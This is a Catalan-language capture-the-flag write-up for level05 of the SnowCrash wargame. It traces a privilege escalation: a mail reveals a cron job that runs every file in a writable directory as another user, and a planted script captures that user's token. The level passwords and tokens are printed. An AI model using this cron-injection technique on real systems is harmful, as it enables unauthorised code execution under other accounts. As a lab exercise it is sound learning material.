# TL;DR / TLTR
##### Ens connectem al següent nivell amb el token/password obtingut en el nivell anterior:
```bash
level04@SnowCrash:~$ ssh level05@192.168.122.220 -p 4242
Could not create directory '/home/user/level04/.ssh'.
The authenticity of host '[192.168.122.220]:4242 ([192.168.122.220]:4242)' can't be established.
ECDSA key fingerprint is 6a:83:c6:2e:df:7a:c8:e0:1c:bc:d8:84:32:e0:84:ad.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/user/level04/.ssh/known_hosts).
           _____                      _____               _     
          / ____|                    / ____|             | |    
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          
level05@192.168.122.220's password: ne2searoevaevoem4ov4ar8ap
You have new mail.
```
##### Busquem pistes:
```bash
level05@SnowCrash:~$ ls -la /tmp
ls: cannot open directory /tmp: Permission denied
level05@SnowCrash:~$ ls -ld /tmp # Pots veure perque no estàs mirant dins, només llistant el directori
d-wx-wx-wx 4 root root 100 Mar 19 17:26 /tmp # La qual cosa ens indica que podem escriure en el directori encara que no poguem llegir-l'ho de manera fàcil, tal i com vam comprovar en l'exercici anterior
```
##### Però la vertadera pista important, ens l'havien donat només entrar al nivell
```bash
level05@192.168.122.220's password: ne2searoevaevoem4ov4ar8ap
You have new mail.
```
##### El text "Yo have new mail", ens indica que tenim un mail, doncs el provarem de trobar-l'ho
```bash
level05@SnowCrash:~$ find / -name mail 2>/dev/null
/usr/lib/byobu/mail
/var/mail
/var/spool/mail
/rofs/usr/lib/byobu/mail
/rofs/var/mail
/rofs/var/spool/mail
level05@SnowCrash:~$ 
```
##### Trobem un fitxer prometador anomenat level05 en la localització /var/mail
```bash
level05@SnowCrash:~$ ls -la /var/mail
total 4
drwxrwsr-x  1 root mail  60 Mar  5  2016 .
drwxr-xr-x  1 root root 160 Mar 12  2016 ..
-rw-r--r--+ 1 root mail  58 Mar 19 18:34 level05
```
##### Mirem el que hi ha dins
```bash
level05@SnowCrash:~$ cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
##### Ens recorda al cron job
```text
CRON TIMING
*/2 * * * * -> */2	cada 2 minuts s'executa
EXECUCIÓ
su -c "sh /usr/sbin/openarenaserver" - flag05
PART        SIGNIFICAT
su        	canviar d’usuari
-c	        executar comanda
"sh ..."	  shell script
- flag05    executar com usuari flag05
```
##### Anem a revisar l'script esmentat dins del cron job
```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
level05@SnowCrash:~$
```
##### Mirem si tinc permisos d'escriptura per poder modificar-l'ho
```bash
level05@SnowCrash:~$ ls -la /usr/sbin/openarenaserver 
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
```
##### Sembla que no, anem a mirar si tenim més sort en el directori de la direcció que executa l'script
```bash
level05@SnowCrash:~$ ls -la /opt/openarenaserver/
total 0
drwxrwxr-x+ 2 root root 40 Mar 20 00:03 .
drwxr-xr-x  1 root root 60 Mar 20 00:03 ..
level05@SnowCrash:~$ ls -ld /opt/openarenaserver/
drwxrwxr-x+ 2 root root 40 Mar 20 00:03 /opt/openarenaserver/
level05@SnowCrash:~$ 
```
##### Percebem detall en els permisos '+' que significa ACL(Access Control List), que potser guarda una llista amb permisos d'access ocults
```bash
level05@SnowCrash:~$ getfacl /opt/openarenaserver/
getfacl: Removing leading '/' from absolute path names
# file: opt/openarenaserver/
# owner: root
# group: root
user::rwx
user:level05:rwx
user:flag05:rwx
group::r-x
mask::rwx
other::r-x
default:user::rwx
default:user:level05:rwx
default:user:flag05:rwx
default:group::r-x
default:mask::rwx
default:other::r-x
```
##### Provem de crear el exploit per explotar la vulnerabilitat amb el petit script, executant la comanda getflag
```bash
echo '#!/bin/bash' > /opt/openarenaserver/exploit
echo '/bin/getflag > /tmp/flag05 2>&1' >> /opt/openarenaserver/exploit
chmod +x /opt/openarenaserver/exploit
```
##### L'explotació hauria de funcionar perquè el cron job s’executa cada dos minuts (* / 2) amb privilegis de l’usuari flag05 i executa tots els fitxers dins del directori /opt/openarenaserver/. Com que aquest directori és escriptible per l’usuari level05, podem injectar un script maliciós. Quan el cron job s’executa, llança aquest script amb privilegis elevats, permetent executar la comanda /bin/getflag com a flag05 i obtenir el token.
```bash
level05@SnowCrash:~$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
level05@SnowCrash:~$ 
```
